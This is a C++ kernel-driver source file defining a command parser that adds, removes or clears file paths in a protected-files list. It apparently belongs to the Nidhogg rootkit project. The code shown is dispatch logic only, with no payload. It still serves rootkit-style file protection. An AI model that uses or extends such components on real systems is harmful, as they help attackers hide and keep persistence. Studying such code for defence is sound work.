#include "pch.h"
#include "FileParser.h"
#include "FileUtils.h"

FileParser::FileParser() {
	this->optionsSize = 3;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::Add, { 1, { ArgType::WCharPtr } } };
	this->options[1] = { Options::Remove, { 1, { ArgType::WCharPtr } } };
	this->options[2] = { Options::Clear, {} };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS FileParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	UNICODE_STRING wFileName = { 0 };
	ProtectedFile protectedFile{};
	NTSTATUS status = STATUS_SUCCESS;

	if (args[0]) {
		if (strlen((PCHAR)args[0]) > MAX_PATH)
			return STATUS_INVALID_BUFFER_SIZE;

		ANSI_STRING aFileName = { 0 };

		// Converting string to unicode.
		RtlInitAnsiString(&aFileName, (PCHAR)args[0]);
		status = RtlAnsiStringToUnicodeString(&wFileName, &aFileName, TRUE);

		if (!NT_SUCCESS(status))
			return status;

		protectedFile.FilePath = wFileName.Buffer;
	}

	switch (commandId) {
	case Options::Add:
	{
		protectedFile.Protect = true;

		if (!NidhoggFileHandler->ProtectFile(protectedFile.FilePath)) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		break;
	}
	case Options::Remove:
	{
		protectedFile.Protect = false;

		if (!NidhoggFileHandler->RemoveFile(protectedFile.FilePath, FileType::Protected)) {
			status = STATUS_NOT_FOUND;
			break;
		}
		break;
	}
	case Options::Clear:
	{
		NidhoggFileHandler->ClearFilesList(FileType::Protected);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	if (protectedFile.FilePath)
		RtlFreeUnicodeString(&wFileName);

	return status;
}
